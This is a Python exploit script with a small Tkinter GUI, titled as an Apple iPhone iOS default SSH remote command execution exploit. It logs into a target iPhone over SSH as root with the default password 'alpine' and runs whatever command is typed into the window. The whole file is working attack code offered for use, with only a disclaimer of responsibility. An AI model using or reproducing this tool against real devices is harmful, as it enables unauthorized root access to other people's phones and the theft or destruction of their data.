#!/usr/bin/python
# When you've launched the command look the terminal
# This software work without Metasploit 
# Exploit Title: [GUI]Apple iPhone iOS Default SSH Remote Command Execution exploit
# Exploit Author: D35m0nd142
# Vendor Homepage: http://www.apple.com
# Screenshot: http://imageshack.us/photo/my-images/84/iphonevy.png/
# Tested on: Ubuntu 12.04 - Backtrack 5 R3 - Windows 7 Home Premium
import paramiko 
import Tkinter 
from tkMessageBox import *
import sys
import os
print "******************************************************************"
print "*Apple iPhone iOS Default SSH Remote Command Execution exploit   *"
print "*                 Created by D35m0nd142                          *"
print "******************************************************************\n" 

root=Tkinter.Tk()
root.geometry("%dx%d" % (490,220))
def exploit():
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ip_iphone=ip.get()
	ssh.connect(ip_iphone,username='root',password='alpine')
	cmd=command.get()
	stdin, stdout, stderr = ssh.exec_command(cmd)
	print stdout.readlines()
	ok=Tkinter.Label(text="Command executed",bg="blue",fg="yellow").pack()	
	ssh.close()

root['bg']="black"
root.title("Apple iOS Default SSH Remote Command Execution exploit")
message=showwarning("Warning","D35m0nd142 isn't responsable for your use of this software")
developer=Tkinter.Label(text="Developed by D35m0nd142").pack(side='bottom')
ip_label=Tkinter.Label(text="iPhone IP: ").pack()
ip=Tkinter.StringVar()
ip_entry=Tkinter.Entry(textvariable=ip).pack()
command_label=Tkinter.Label(text="Command to execute: ").pack()
command=Tkinter.StringVar()
command_entry=Tkinter.Entry(textvariable=command).pack()
launch_exploit=Tkinter.Button(text="Exploit",command=exploit).pack()
root.mainloop()
